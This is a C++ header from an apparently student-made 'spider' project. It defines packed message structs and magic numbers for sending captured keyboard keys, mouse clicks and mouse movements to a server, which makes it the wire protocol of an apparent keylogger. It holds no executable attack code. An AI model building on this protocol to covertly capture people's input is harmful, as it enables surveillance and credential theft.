//
// protocol.hpp for  in /home/gandoulf/epitech/cpp_spider/include/spider
//
// Made by Gandoulf
// Login   <gandoulf@epitech.net>
//
// Started on  Sat Nov  5 15:44:31 2016 Gandoulf
// Last update Tue Nov  8 14:15:03 2016 debrab_t
//

#ifndef PROTOCOL_HPP_
# define PROTOCOL_HPP_

# define SEND	0x6D695F55
# define REC	0x611E283D
# define HEADER	12

#ifdef _WIN32
#define PACK( __Declaration__ ) __pragma( pack(push, 1) ) __Declaration__ __pragma( pack(pop) )
#else
#define PACK( __Declaration__ ) __Declaration__ __attribute__((__packed__))
#endif

PACK(
typedef struct PackageHeader
{
  int	magicNumber;
  int	size;
  int	id;
}) PackageHeader;

PACK(
typedef struct Test
{
  char	cmd[3];
  char	str[100];
}) Test;

PACK(
typedef struct PackageCMDIDN
{
  char	cmd[3];
  int	id;
  char	key[50];
}) PackageCMDIDN;

PACK(
typedef struct PackageCMDIDNAnswer
{
  PackageHeader	header;
  char		cmd[3];
  int		id;
}) PackageCMDIDNAnswer;

PACK(
typedef struct PackageCMDMouseClic
{
  char		cmd[3];
  unsigned int	timestamp;
  int		x;
  int		y;
  char		id[30];
}) PackageCMDMouseClic;

PACK(
typedef struct PackageCMDMouseMove
{
  char		cmd[3];
  unsigned int	timestamp;
  int		x;
  int		y;
}) PackageCMDMouseMove;

PACK(
typedef struct PackageCMDKeyboardTouch
{
  char		cmd[3];
  unsigned int	timestamp;
  char		id[30];
}) PackageCMDKeyboardTouch;

PACK(
typedef struct PackageCMDLogOut
{
  char	cmd[3];
}) PackageCMDLogOut;

PACK(
typedef struct PackageAnswer
{
  PackageHeader	header;
  int		code;
  char		cmd[3];
  char		msg[20];
}) PackageAnswer;

PACK(
typedef struct PackageAnswer2
{
	int		code;
	char	cmd[3];
	char	msg[20];
}) PackageAnswer2;

PACK(
typedef struct PackageCMDTime
{
  char	cmd[3];
  int	timer;
}) PackageCMDTime;

PACK(
typedef struct PackageCMD
{
  char	cmd[3];
}) PackageCMD;

PACK(
typedef struct PackageCMDPING
{
  char	cmd[3] ;
  char	id[20] ;
}) PackageCMDPING;

#endif /* PROTOCOL_HPP_ */
